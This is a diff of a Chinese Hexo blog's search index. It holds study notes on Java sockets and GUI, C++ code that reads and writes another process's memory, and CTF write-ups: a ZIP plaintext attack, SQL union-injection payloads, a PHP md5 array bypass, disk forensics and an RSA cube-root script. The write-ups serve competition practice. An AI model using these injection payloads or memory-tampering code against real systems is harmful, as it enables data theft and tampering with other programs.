&#x3D;&#x3D;NULL)</span><br><span class="line">			return false;</span><br><span class="line">	&#125;</span><br><span class="line">	LPBYTE lpBuff &#x3D; new BYTE[systemInfo.dwPageSize];</span><br><span class="line">	list&lt;MEMORY_BASIC_INFORMATION&gt;::iterator it;</span><br><span class="line">	for(it&#x3D;MemList.begin();it!&#x3D;MemList.end();it++)&#123;</span><br><span class="line">		if(it-&gt;State !&#x3D; MEM_COMMIT)&#123;</span><br><span class="line">			continue;</span><br><span class="line">		&#125;</span><br><span class="line">		DWORD dwSize &#x3D;0;</span><br><span class="line">		SIZE_T dwReadBytes&#x3D;0;</span><br><span class="line">		while(dwSize &lt; it-&gt;RegionSize)&#123;</span><br><span class="line">			LPVOID lpAddr &#x3D; (LPVOID)((DWORD)it-&gt;BaseAddress+dwSize);</span><br><span class="line">			if(ReadProcessMemory(hProcess,lpAddr,lpBuff,systemInfo.dwPageSize,&amp;dwReadBytes)&#x3D;&#x3D;FALSE)&#123;</span><br><span class="line">				dwSize +&#x3D;systemInfo.dwPageSize;</span><br><span class="line">				continue;</span><br><span class="line">			&#125;</span><br><span class="line">			for(int i&#x3D;0;i&lt;dwReadBytes -3;i++)&#123;</span><br><span class="line">				if(*((DWORD *)(lpBuff+i)) &#x3D;&#x3D;dwValue)&#123;</span><br><span class="line">					AddrList.push_back((DWORD)lpAddr+i);</span><br><span class="line">				&#125;</span><br><span class="line">				if(AddrList.size()&#x3D;&#x3D;MAX_ADDR_NUM)&#123;</span><br><span class="line">					delete []lpBuff;</span><br><span class="line">					CloseHandle(hProcess);</span><br><span class="line">					return true;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			dwSize+&#x3D;systemInfo.dwPageSize;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	delete []lpBuff;</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bool ModifyProcessMemory(DWORD dwProcessId,DWORD dwTagAddr,DWORD dwValue)&#123;</span><br><span class="line">	HANDLE hProcess &#x3D; INVALID_HANDLE_VALUE;</span><br><span class="line">	if(dwProcessId !&#x3D;GetCurrentProcessId())&#123;</span><br><span class="line">		hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcessId);</span><br><span class="line">		if(hProcess &#x3D;&#x3D;NULL)</span><br><span class="line">			return false;</span><br><span class="line">	&#125;</span><br><span class="line">	SIZE_T dwWriteBytes &#x3D;0;</span><br><span class="line">	DWORD dwOldProtect;</span><br><span class="line">	if(!VirtualProtectEx(hProcess,(LPVOID)dwTagAddr,sizeof(DWORD),PAGE_EXECUTE_READWRITE,&amp;dwOldProtect))&#123;</span><br><span class="line">		cout&lt;&lt;&quot;protect!&quot;&lt;&lt;endl;</span><br><span class="line">		DWORD dwReturn &#x3D; GetLastError();</span><br><span class="line">		cout&lt;&lt;dwReturn&lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line">	if(!WriteProcessMemory(hProcess,(LPVOID)dwTagAddr,&amp;dwValue,sizeof(DWORD),&amp;dwWriteBytes))&#123;</span><br><span class="line">		cout&lt;&lt;&quot;write failed&quot;&lt;&lt;endl;</span><br><span class="line">		DWORD dwReturn &#x3D; GetLastError();</span><br><span class="line">		cout&lt;&lt;dwReturn&lt;&lt;endl;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line">	VirtualProtectEx(hProcess,(LPVOID)dwTagAddr,sizeof(DWORD),dwOldProtect,NULL);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">		return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 ]]></content>
@@ -669,35 +560,91 @@
       </tags>
   </entry>
   <entry>
-    <title>指令集和操作系统位数</title>
-    <url>/2020/06/10/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%8C%87%E4%BB%A4%E9%9B%86%E5%92%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%8D%E6%95%B0/</url>
-    <content><![CDATA[<h2 id="指令集"><a class="header-anchor" href="#指令集"></a>指令集</h2>
-<p>为了提高编写和运行程序的效率，将一些较为常用的指令（如积分，微分，乘除法等）写成一套标准的程序，即指令集。</p>
-<h3 id="X86和ARM"><a class="header-anchor" href="#X86和ARM"></a>X86和ARM</h3>
-<p>完整的，复杂的指令集称作<code>CISC</code> (Complex Instruction Set Computing)，在复杂指令集中许多运算是不常用的，让CPU支持所有指令是对晶体管的严重浪费，所以亨尼西和帕特森等人提出了一种更加简单的指令集，叫做精简指令集<code>RISC</code> (Reduced Instruction Set Computing)</p>
-<p><code>X86</code>是英特尔推出的一种CPU架构，采用复杂指令集CISC</p>
-<p><code>ARM</code>是acorn公司设计的CPU架构，采用精简指令集RISC</p>
-<h2 id="操作系统位数"><a class="header-anchor" href="#操作系统位数"></a>操作系统位数</h2>
-<p>首先明确<code>CPU位数</code>的概念，CPU位数即CPU在一个时钟周期内能够处理的二进制串的位数，也是CPU寄存器的位数。目前64位的CPU是主流。</p>
-<p>而<strong>操作系统位数</strong>即操作系统所依赖的指令集位数，可以理解为：32位的操作系统假定CPU是32位的，64位操作系统则假定CPU是64位的。所以，64位CPU的主机可以安装64位和32位甚至更低位数的操作系统，而32位CPU的主机只能安装32位及以下的操作系统（即向下兼容）。</p>
+    <title>压缩包破解</title>
+    <url>/2020/08/18/CTF/%E6%9D%82%E9%A1%B9/%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
+    <content><![CDATA[<h1>ZIP明文攻击</h1>
+<h2 id="CISCN-2017-WarmUp"><a class="header-anchor" href="#CISCN-2017-WarmUp"></a>[CISCN 2017] WarmUp</h2>
+<p>给我们的是一个加密的压缩包以及一个 readme.txt</p>
+<p>而压缩包中也存在该文件</p>
+<p>考虑ZIP明文攻击</p>
+<ol>
+<li>
+<p>将 readme.txt 压缩为 readme.zip</p>
+</li>
+<li>
+<p>使用 bandzip 打开，查看CRC校验码</p>
+</li>
+<li>
+<p>发现 readme.zip 与加密压缩包中的 readme.txt 校验码相同，说明可以使用ZIP明文攻击</p>
+</li>
+<li>
+<p>使用<code>ARCHPR</code>对加密压缩包进行破解即可</p>
+<p><img src="/2020/08/18/CTF/%E6%9D%82%E9%A1%B9/%E5%8E%8B%E7%BC%A9%E5%8C%85/image-20200818122011977.png" alt="image-20200818122011977"></p>
+</li>
+</ol>
 ]]></content>
       <categories>
-        <category>专业课</category>
-        <category>操作系统</category>
+        <category>CTF</category>
+        <category>杂项</category>
       </categories>
       <tags>
-        <tag>操作系统</tag>
+        <tag>CTF</tag>
+        <tag>Misc</tag>
       </tags>
   </entry>
   <entry>
-    <title>Java网络编程</title>
-    <url>/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
-    <content><![CDATA[<h1>SOCKET</h1>
-<p><strong>定义：<code>socket</code>即套接字，由 ip 地址和端口号两个部分组成</strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InetAddress类：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getByName</span><span class="params">(String host)</span> <span class="comment">//根据域名获取ip</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getLocalHost</span><span class="params">()</span> <span class="comment">//获取本地ip</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHostAddress</span><span class="params">()</span> <span class="comment">//获得InetAddress对象的ip地址</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHostName</span><span class="params">()</span> <span class="comment">//获得InetAddress对象的域名</span></span></span><br></pre></td></tr></table></figure>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Socket类：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(InetAddress address, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(String host, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Socket <span class="title">accept</span><span class="params">()</span> <span class="comment">//服务器端接收socket连接请求，创建socket对象</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输入流，用于接收网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> OutputStream <span class="title">getOutputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输出流，用于发送网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getInetAddress</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程IP地址或null</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getLocalAddress</span><span class="params">()</span> <span class="comment">//获取套接字绑定的本地地址</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPort</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程端口号或0</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLocalPort</span><span class="params">()</span> <span class="comment">//返回此套接字绑定到的本地端口或 -1</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
-<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708193332767.png" alt="image-20200708193332767"></p>
-<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708213133726.png" alt="image-20200708213133726"></p>
+    <title>ACTF校赛Web</title>
+    <url>/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/</url>
+    <content><![CDATA[<h1>Misc</h1>
+<h2 id="题目：签到"><a class="header-anchor" href="#题目：签到"></a>题目：签到</h2>
+<p><strong>flag值：ACTF{WeLc0mm_tO_acTf}</strong></p>
+<p>关注公众号，回复“一句话”即可</p>
+<h1>Crypto</h1>
+<h2 id="题目：Column-Permutation-Cipher"><a class="header-anchor" href="#题目：Column-Permutation-Cipher"></a>题目：Column Permutation Cipher</h2>
+<p><strong>flag值：actf{welcome_to_the_world_of_cryptography}</strong></p>
+<p>列换位密码，用密码学实验的脚本跑一下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret=<span class="string">""</span></span><br><span class="line">secret=input(<span class="string">"ciphertext:"</span>)</span><br><span class="line">length=len(secret)</span><br><span class="line">print(length)</span><br><span class="line">answer=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">26</span>):</span><br><span class="line">    k=length</span><br><span class="line">    <span class="keyword">while</span> k%n!=<span class="number">0</span>:</span><br><span class="line">        k=k+<span class="number">1</span></span><br><span class="line">    m=k//n</span><br><span class="line">    answer=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i,length,m):</span><br><span class="line">            answer+=secret[j]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">' is '</span> <span class="keyword">in</span> answer :</span><br><span class="line">            print(<span class="string">"############"</span>)</span><br><span class="line">            print(answer)</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200606101942263.png" alt="image-20200606101942263"></p>
+<h1>Web</h1>
+<h2 id="题目：sql注入入门题"><a class="header-anchor" href="#题目：sql注入入门题"></a>题目：sql注入入门题</h2>
+<p><strong>flag值：（没记。。）</strong></p>
+<p>一个数字型SQL回显注入</p>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/ACTF%E6%A0%A1%E8%B5%9BWeb%5Cimage-20200529222156910.png" alt="image-20200529222156910"></p>
+<p>首先猜出字段数为4</p>
+<p>联合查询得到数据库名</p>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529222846198.png" alt="image-20200529222846198"></p>
+<p>数据表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema&#x3D;&#39;easy_sql_injection&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223409586.png" alt="image-20200529223409586"></p>
+<p>列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(column_name),2,3,4 from information_schema.columns where table_name&#x3D;&#39;Notice&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223713519.png" alt="image-20200529223713519"></p>
+<p>读取数据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(flag),2,3,4 from Notice</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<h2 id="题目：PHP代码审计入门题"><a class="header-anchor" href="#题目：PHP代码审计入门题"></a>题目：PHP代码审计入门题</h2>
+<p><strong>flag值：（没记。。）</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"not allow!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'key'</span>] != $_SESSION[<span class="string">'key'</span>]) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Wrong key!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>]) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Your password can not be your username!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一次登录时，SESSION为空，所以POST一个<code>key=</code>即可，然后是md5，</p>
+<p><code>username[]=1</code> <code>password[]=2</code>即可满足条件</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java-GUI编程</title>
+    <url>/2020/07/10/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/GUI%E7%BC%96%E7%A8%8B/</url>
+    <content><![CDATA[<h1>swing</h1>
+<p><strong>JFrame</strong> – java的GUI程序的基本思路是以JFrame为基础，它是屏幕上window的对象，能够最大化、最小化、关闭。<br>
+<strong>JPanel</strong> – Java图形用户界面(GUI)工具包swing中的面板容器类，包含在javax.swing 包中，可以进行嵌套，功能是对窗体中具有相同逻辑功能的组件进行组合，是一种轻量级容器，可以加入到JFrame窗体中。</p>
+<p><strong>JLabel</strong> – JLabel 对象可以显示文本、图像或同时显示二者。可以通过设置垂直和水平对齐方式，指定标签显示区中标签内容在何处对齐。默认情况下，标签在其显示区内垂直居中对齐。默认情况下，只显示文本的标签是开始边对齐；而只显示图像的标签则水平居中对齐。</p>
+<p><strong>JTextField</strong> –一个轻量级组件，它允许编辑单行文本。</p>
+<p><strong>JPasswordField</strong> – 允许我们输入一行字，像输入框，但隐藏输入字符为星号(*)。</p>
+<p><strong>JButton</strong> – JButton 类的实例。用于创建按钮类似实例中的 “Login”。</p>
 ]]></content>
       <categories>
         <category>编程语言</category>
@@ -705,6 +652,7 @@
       </categories>
       <tags>
         <tag>Java</tag>
+        <tag>GUI</tag>
       </tags>
   </entry>
   <entry>
@@ -750,6 +698,60 @@
       </tags>
   </entry>
   <entry>
+    <title>国赛2020WP</title>
+    <url>/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/</url>
+    <content><![CDATA[<h1>Misc</h1>
+<h2 id="签到"><a class="header-anchor" href="#签到"></a>签到</h2>
+<p>助力即可得到flag</p>
+<h2 id="the-best-ctf-game"><a class="header-anchor" href="#the-best-ctf-game"></a>the_best_ctf_game</h2>
+<p>解压得到二进制文件:flag</p>
+<p>使用winhex打开</p>
+<p>观察到</p>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820142658465.png" alt="image-20200820142658465"></p>
+<p>即flag的值</p>
+<h2 id="电脑被黑"><a class="header-anchor" href="#电脑被黑"></a>电脑被黑</h2>
+<p>解压缩包得到disk_dump文件</p>
+<p>使用file 命令查看信息</p>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201008231.png" alt="image-20200820201008231"></p>
+<p>可以看到是ext3的文件系统</p>
+<p>挂载到 test文件夹下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount .&#x2F;disk_dump .&#x2F;test&#x2F;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201521587.png" alt="image-20200820201521587"></p>
+<p>查看???.png，提示flag已被删除</p>
+<p>使用extundelete恢复被删除的文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extundelete .&#x2F;disk_dump --restore-all</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201902816.png" alt="image-20200820201902816"></p>
+<p>得到flag.txt，但打开后是乱码</p>
+<p>返回test/misc01文件夹下，看到可执行文件demo</p>
+<p>使用strings命令查看</p>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820202222131.png" alt="image-20200820202222131"></p>
+<p>猜测demo对flag.txt进行了处理</p>
+<p>使用ida反编译查看其伪源码</p>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/20200820202837.png" alt="image-20200820202837"></p>
+<p>编写代码对flag文件进行解码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fileOld = fopen(<span class="string">"D:\\flag.txt"</span>,<span class="string">"rb"</span>);</span><br><span class="line">    FILE *fileNew = fopen(<span class="string">"D:\\flagNew.txt"</span>,<span class="string">"rb+"</span>);</span><br><span class="line">    <span class="keyword">char</span> v1,v4,v5;</span><br><span class="line">    v4 = <span class="number">34</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 = fgetc(fileOld);</span><br><span class="line">        <span class="keyword">if</span>( v1 == <span class="number">-1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        fputc(((v1^v4)-v5),fileNew);</span><br><span class="line">        v4 += <span class="number">34</span>;</span><br><span class="line">        v5 = (v5 + <span class="number">2</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fileNew);</span><br><span class="line">    fclose(fileOld);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>解码后得到flag</p>
+<h1>break it 环节</h1>
+<p>只做出来一道题</p>
+<h2 id="baby"><a class="header-anchor" href="#baby"></a>baby</h2>
+<p>一道RSA的密码学题目</p>
+<p>给了我们密文c和因数n，e很小。所以可以通过爆破的方式跑出明文</p>
+<p>解密脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import gmpy</span><br><span class="line">n &#x3D; 691316677109436623113422493782665795857921917893759942123087462879884062720557906429183155859597756890896192044003240821906332575292476160072039505771794531255542244123516929671277306361467074545720823735806308003091983427678300287709469582282466572230066580195227278214776280213722215953097747453437289734469454712426107967188109548966907237877840316009828476200388327329144783877033491238709954473809991152727333616022406517443130542713167206421787038596312975153165848625721911080561242646092299016802662913017071685740548699163836007474224715426587609549372289181977830092677128368806113131459831182390520942892670696447128631485606579943885812260640805756035377584155135770155915782120025116486061540105139339655722904721294629149025033066823599823964444620779259106176913478839370100891213072100063101232635183636552360952762838656307300621195248059253614745118852163569388418086291748805100175008658387803878200034840215506516715640621165661642177371863874586069524022258642915100615596032443145034847031564356671559179212705466145609698475546210994748949121359853094247990533075004393534565421776468785821261291309463205314057882016266066365636018084499158806717036972590848458891019171583268920180691221168453612029698510271</span><br><span class="line">c &#x3D; 3442467842482561323703237574537907554035337622762971103210557480050349359873041624336261782731509068910003360547049942482415036862904844600484976674423604861710166033558576921438068555951948966099658902606725292551952345193132973996288566246138708754810511646811362017769063041425115712305629748341207792305694590742066971202523405301561233341991037374101265623265332070787449332991792097090044761973705909217137119649091313457206589803479797894924402017273543719924849592070328396276760381501612934039653</span><br><span class="line">i &#x3D; 0</span><br><span class="line">while 1:</span><br><span class="line">    if(gmpy.root(c+i*n, 3)[1]&#x3D;&#x3D;1):</span><br><span class="line">        print gmpy.root(c+i*n, 3)</span><br><span class="line">        break</span><br><span class="line">    i &#x3D; i+1</span><br></pre></td></tr></table></figure>
+<p>结果是</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">m&#x3D;1509929362729692740720713536968392715648402189242304424408501797538190273763219595501810359943405524344790331677540693316488309231687357778980543085568230705511696327037</span><br></pre></td></tr></table></figure>
+<p>再解码得到flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import libnum</span><br><span class="line">n&#x3D;1509929362729692740720713536968392715648402189242304424408501797538190273763219595501810359943405524344790331677540693316488309231687357778980543085568230705511696327037</span><br><span class="line">print(libnum.n2s(n))</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200920135022901.png" alt="image-20200920135022901"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java 抽象类和接口</title>
     <url>/2020/04/27/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3/</url>
     <content><![CDATA[<h1>抽象类</h1>
@@ -780,15 +782,14 @@
       </tags>
   </entry>
   <entry>
-    <title>Java-GUI编程</title>
-    <url>/2020/07/10/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/GUI%E7%BC%96%E7%A8%8B/</url>
-    <content><![CDATA[<h1>swing</h1>
-<p><strong>JFrame</strong> – java的GUI程序的基本思路是以JFrame为基础，它是屏幕上window的对象，能够最大化、最小化、关闭。<br>
-<strong>JPanel</strong> – Java图形用户界面(GUI)工具包swing中的面板容器类，包含在javax.swing 包中，可以进行嵌套，功能是对窗体中具有相同逻辑功能的组件进行组合，是一种轻量级容器，可以加入到JFrame窗体中。</p>
-<p><strong>JLabel</strong> – JLabel 对象可以显示文本、图像或同时显示二者。可以通过设置垂直和水平对齐方式，指定标签显示区中标签内容在何处对齐。默认情况下，标签在其显示区内垂直居中对齐。默认情况下，只显示文本的标签是开始边对齐；而只显示图像的标签则水平居中对齐。</p>
-<p><strong>JTextField</strong> –一个轻量级组件，它允许编辑单行文本。</p>
-<p><strong>JPasswordField</strong> – 允许我们输入一行字，像输入框，但隐藏输入字符为星号(*)。</p>
-<p><strong>JButton</strong> – JButton 类的实例。用于创建按钮类似实例中的 “Login”。</p>
+    <title>Java网络编程</title>
+    <url>/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
+    <content><![CDATA[<h1>SOCKET</h1>
+<p><strong>定义：<code>socket</code>即套接字，由 ip 地址和端口号两个部分组成</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InetAddress类：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getByName</span><span class="params">(String host)</span> <span class="comment">//根据域名获取ip</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getLocalHost</span><span class="params">()</span> <span class="comment">//获取本地ip</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHostAddress</span><span class="params">()</span> <span class="comment">//获得InetAddress对象的ip地址</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHostName</span><span class="params">()</span> <span class="comment">//获得InetAddress对象的域名</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Socket类：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(InetAddress address, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(String host, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Socket <span class="title">accept</span><span class="params">()</span> <span class="comment">//服务器端接收socket连接请求，创建socket对象</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输入流，用于接收网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> OutputStream <span class="title">getOutputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输出流，用于发送网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getInetAddress</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程IP地址或null</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getLocalAddress</span><span class="params">()</span> <span class="comment">//获取套接字绑定的本地地址</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPort</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程端口号或0</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLocalPort</span><span class="params">()</span> <span class="comment">//返回此套接字绑定到的本地端口或 -1</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708193332767.png" alt="image-20200708193332767"></p>
